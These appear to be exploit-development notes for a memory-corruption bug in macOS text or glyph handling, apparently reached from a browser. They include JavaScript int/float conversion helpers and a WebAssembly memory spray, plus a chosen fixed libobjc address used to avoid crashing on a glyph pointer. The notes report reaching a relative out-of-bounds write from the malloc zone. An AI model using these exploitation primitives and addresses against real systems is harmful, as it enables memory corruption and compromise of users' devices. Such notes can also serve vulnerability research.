with wasm, i can put arbitrary values on the stack

if i use BigUint64Array, the stack layout will change a lot, so this is not usable
it works when using Float64Array with this conversion utils

```js
let conversion_buffer = new ArrayBuffer(8);
let float_view = new Float64Array(conversion_buffer);
let int_view = new BigUint64Array(conversion_buffer);
BigInt.prototype.hex = function () {
    return '0x' + this.toString(16);
};
BigInt.prototype.i2f = function () {
    int_view[0] = this;
    return float_view[0];
}
Number.prototype.f2i = function () {
    float_view[0] = this;
    return int_view[0];
}

const array = new Float64Array(memory.buffer, 0, 100)
array.set([
    BigInt("0").i2f(),
    BigInt("1").i2f(),
    BigInt("2").i2f(),
    BigInt("3").i2f(),
    BigInt("4").i2f(),
    BigInt("5").i2f(),
])
```

confirmed that this region is always at this area

```
__OBJC_RW                [0x00007FFF8E200000 - 0x00007FFF8E2FE000) - rw-/rw- SM=COW /usr/lib/libobjc.A.dylib
```

so just pick an address from here that wont make the program crash when accessing `trunglue->glyphs`, `0x00007FFF8E200038` works well

with this, managed to achieve relative oob write from MALLOC_ZONE
also fixed up a few more ligature actions to delay returning